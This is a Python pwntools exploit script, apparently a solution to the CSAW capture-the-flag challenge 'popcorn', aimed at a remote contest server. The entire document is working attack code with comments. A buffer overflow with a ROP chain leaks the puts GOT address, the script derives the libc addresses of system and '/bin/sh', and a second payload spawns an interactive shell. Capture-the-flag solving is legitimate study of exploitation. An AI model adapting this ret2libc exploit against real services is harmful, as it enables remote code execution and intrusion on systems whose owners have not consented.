from pwn import *
import binascii

context.terminal = ['konsole', '-e']

## First we find the difference between the buffer and saved RIP 
## So we know how much of the buffer to fill with junk
buf_offset = 0x7fffffffe6c0
rip_offset = 0x7fffffffe748
offset_dif = rip_offset - buf_offset

# The address of 'puts@got.plt' which is what we want to jump to and leak
puts_got =   (0x00000000000404018)

# We find our offsets from the libc base and calculate system and binsh relatively from those offsets
puts_libc_addr = 0x71910 # the offset from 0x0 in the given libc
puts_system_offset = puts_libc_addr - 0x449c0
puts_binsh_offset = puts_libc_addr - 0x181519

# p = process('./popcorn')
p = remote('pwn.chal.csaw.io', 1006)

"""
gdb.attach(p, '''
''')
"""

print(p.recvline())
#for i in range(0x10):

# call puts(&puts) effectively
# we need the address of puts with this leak so we can calculate where system and binsh are located
stage_a = ''
stage_a += 'A' * offset_dif
stage_a += p64(0x00000000004011eb) # pop rdi ; ret
stage_a += p64(puts_got) # addr of puts@got
stage_a += p64(0x0000000000401169) # addr of call puts

# we receive back the address in 'puts@got.plt' which is the dynamically loaded address of puts.
p.sendline(stage_a)
leak = binascii.hexlify(p.recvline())[:-2]
leak_formatted = '0x' + ''.join([leak[x:x+2] for x in range(0, len(leak), 2)][::-1])
# we format the address and print out some addresses for debugging purposes
print("GOT:" + leak_formatted + ":")
print("BSH:" + hex(int(leak_formatted, 16) - puts_binsh_offset))
print("SYS:" + hex(int(leak_formatted, 16) - puts_system_offset))


# we now pop the address of "/bin/sh" into RDI and the return to the address of system
# effectively calling system("/bin/sh")
stage_b = ''
stage_b += 'A' * offset_dif
stage_b += p64(0x00000000004011eb) # pop rdi ; ret
stage_b += p64(int(leak_formatted, 16) - puts_binsh_offset) # addr of /bin/sh in libc
stage_b += p64(0x0000000000401016) # ret
stage_b += p64(int(leak_formatted, 16) - puts_system_offset) # addr of system

p.sendline(stage_b)
p.interactive()



# puts_got -= 1
